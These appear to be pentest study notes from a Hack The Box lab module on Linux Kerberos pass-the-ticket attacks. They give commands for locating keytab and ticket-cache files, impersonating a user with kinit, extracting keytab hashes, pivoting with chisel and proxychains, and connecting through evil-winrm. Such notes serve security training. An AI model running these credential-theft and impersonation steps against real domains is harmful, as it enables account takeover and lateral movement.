Linux Pass the Ticket
#######################

Date: 2024-11-27 12:52

Status:

Files
**********

Tickets are almost always stored in the ``/tmp`` file system
``ls -ls /tmp`` The ticket is also stored in the environmental variable
name KRB5CCNAME You authenticate to a domain controller with the
:ref:`keytab` /etc/krb5.keytab is root readable only, **if you
have root you can use this** A Linux script can use a keytab in
automation on Windows.

Finding Keytab files
*********************

example 1: using find

.. code-block:: console

   find / -name *keytab* -ls 2>/dev/null

Example 2: using crontab

.. code-block:: console

   crontab -l

Commands
===========

Example 1: To see if a Linux machine is using AD

.. code-block:: console

   realm list

Example 2: realm is not available

.. code-block:: console

   ps -ef | grep -i "winbind\|sssd"

Example 3: using env to find the krb5 cache

.. code-block:: console

   env | grep -i krb5

Example 4: Listing keytab file information

.. code-block:: console

   klist -k -t /opt/specialfiles/carlos.keytab

Impersonating a user
=====================

example 1: Using kinit and have the ability to read someone else’s
keytab

.. code-block:: console

   klist
   kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
   klist

Example 2: Using SMB to access information

.. code-block:: console


   smbclient //dc01/carlos -k -c ls

Keytab extraction
=====================

Example 1: using :ref:`keytabextract.py`

.. code-block:: console

   python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

Linux Attack tools
=====================

Example 1: Linux needs to pivot through WS01 to get to the domain
controller

.. mermaid:: ../mmd/pass-the-ticket.mmd

Step 0: Add relevant windows hosts that cannot be resolved to
``/etc/hosts`` Step 1: Install :ref:`proxychains` and add
to your ``/etc/proxychains.conf`` file

.. code-block:: console

   [ProxyList]
   socks5 127.0.0.1 1080

Step 2:
:ref:`chisel` #Example 1 Run a server on port 1080
Step 3:
:ref:`chisel` Example 2 Run a client to connect to the server
Step 4: set your KRB5CCNAME env

.. code-block:: console

   Temen@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

To use evil-winrm with Kerberos, you need to install the krb5-user
program

.. code-block:: console

   sudo apt install krb5-user -y

The configuration for this program is ``/etc/krb5.conf`` Example:
``cat /etc/krb5.conf``

.. code-block:: console

   [libdefaults]
           default_realm = INLANEFREIGHT.HTB

   <SNIP>

   [realms]
       INLANEFREIGHT.HTB = {
           kdc = dc01.inlanefreight.htb
       }

Step 5: Using evil-winrm and kerberos authentication
:ref:`evil-winrm` Using Kerberos authentication

:ref:`proxychains`

:ref:`chisel`

:ref:`Linikatz`


References
*****************
https://academy.hackthebox.com/module/147/section/1657
